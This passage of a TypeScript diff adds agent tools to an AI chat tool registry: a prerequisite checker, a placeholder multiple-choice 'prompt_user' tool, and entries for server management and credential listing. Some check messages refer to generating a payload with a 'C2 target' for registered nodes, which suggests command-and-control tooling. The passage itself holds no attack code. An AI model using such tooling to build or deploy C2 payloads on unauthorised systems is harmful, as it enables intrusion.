+                item: "Target nodes",
+                status: "ok",
+                detail: `${nodes.length} node(s) available`,
+              }
+            : {
+                item: "Target nodes",
+                status: "missing",
+                detail:
+                  "No nodes registered — payload will have no C2 target",
+              },
+        )
+        checks.push(
+          config
+            ? {
+                item: "Server config",
+                status: "ok",
+                detail: "Config exists",
+              }
+            : {
+                item: "Server config",
+                status: "missing",
+                detail: "No config — generated payload may misconfigured",
+              },
+        )
+        break
+      case "apply_config":
+        checks.push(
+          nodes.length > 0
+            ? {
+                item: "Nodes available",
+                status: "ok",
+                detail: `${nodes.length} node(s)`,
+              }
+            : {
+                item: "Nodes",
+                status: "missing",
+                detail: "No nodes to apply config to",
+              },
+        )
+        checks.push(
+          config
+            ? {
+                item: "Server config",
+                status: "ok",
+                detail: "Config exists",
+              }
+            : {
+                item: "Server config",
+                status: "missing",
+                detail: "No server config",
+              },
+        )
+        break
+      default:
+        checks.push({
+          item: "System overview",
+          status: "ok",
+          detail: "Run system_status for full health check",
+        })
+    }
+
+    const missingItems = checks
+      .filter((c) => c.status === "missing")
+      .map((c) => c.item)
+    return { ready: missingItems.length === 0, checks, missingItems }
+  },
+}
+
+/* ------------------------------------------------------------------ */
+/*  Tool: prompt_user                                                 */
+/* ------------------------------------------------------------------ */
+
+const PromptUserInput = z.object({
+  question: z.string().min(1).max(500).describe("The question to ask the user"),
+  options: z.array(z.object({
+    label: z.string().min(1).max(100).describe("Short label for the option (displayed to user)"),
+    value: z.string().min(1).max(100).describe("The value to return if this option is selected"),
+    description: z.string().max(200).optional().describe("Additional description for the option"),
+  })).min(2).max(8).describe("List of options to present (2-8 options)"),
+  multiSelect: z.boolean().default(false).describe("Allow user to select multiple options"),
+})
+
+export const promptUserTool: AgentTool<
+  z.infer<typeof PromptUserInput>,
+  {
+    question: string
+    options: Array<{ label: string; value: string; description?: string }>
+    multiSelect: boolean
+    userSelection?: string | string[]
+    status: "pending" | "answered" | "cancelled"
+    message: string
+  }
+> = {
+  name: "prompt_user",
+  description:
+    "Present a multiple-choice question to the user and wait for their selection. Use this when you need clarification on parameters (provider, region, size, etc.) instead of guessing or using defaults. " +
+    "Returns the user's selection(s). If the user cancels, returns cancelled status.",
+  parameters: PromptUserInput,
+  jsonSchema: {
+    type: "object",
+    properties: {
+      question: {
+        type: "string",
+        description: "MANDATORY: The question to ask the user — you MUST provide this parameter"
+      },
+      options: {
+        type: "array",
+        items: {
+          type: "object",
+          properties: {
+            label: { type: "string", description: "Short label for the option" },
+            value: { type: "string", description: "Value to return if selected" },
+            description: { type: "string", description: "Additional description" }
+          },
+          required: ["label", "value"]
+        },
+        description: "MANDATORY: List of options (2-8) — you MUST provide this parameter"
+      },
+      multiSelect: {
+        type: "boolean",
+        default: false,
+        description: "Allow multiple selections"
+      }
+    },
+    required: ["question", "options"],
+  },
+  async run(input) {
+    // This is a placeholder - in a real implementation, this would:
+    // 1. Store the prompt in a database
+    // 2. Return a "pending" status
+    // 3. The frontend would poll or use WebSocket to get the prompt
+    // 4. User selects an option
+    // 5. The tool is called again with the selection
+    //
+    // For now, we'll return a simulated response for testing
+    return {
+      question: input.question,
+      options: input.options,
+      multiSelect: input.multiSelect,
+      userSelection: undefined,
+      status: "pending",
+      message: "Waiting for user selection. In a full implementation, this would present a UI prompt to the user."
+    }
+  },
+}
+
+/* ------------------------------------------------------------------ */
 /*  Registry of all AI chat tools                                     */
 /* ------------------------------------------------------------------ */
 
@@ -2495,6 +3570,16 @@ export const AI_TOOLS = {
   [incidentResponseTool.name]: incidentResponseTool,
   [networkAnalysisTool.name]: networkAnalysisTool,
   [threatIntelligenceTool.name]: threatIntelligenceTool,
+  [systemStatusTool.name]: systemStatusTool,
+  [listUsersInfoTool.name]: listUsersInfoTool,
+  [getUserInfoTool.name]: getUserInfoTool,
+  [manageServerTool.name]: manageServerTool,
+  [getClientConfigTool.name]: getClientConfigTool,
+  [searchSystemTool.name]: searchSystemTool,
+  [listCredentialsInfoTool.name]: listCredentialsInfoTool,
+  [generatePlanTool.name]: generatePlanTool,
+  [checkPrerequisitesTool.name]: checkPrerequisitesTool,
+  [promptUserTool.name]: promptUserTool,
 } as const
 
 export const AI_TOOL_NAMES = Object.keys(AI_TOOLS)
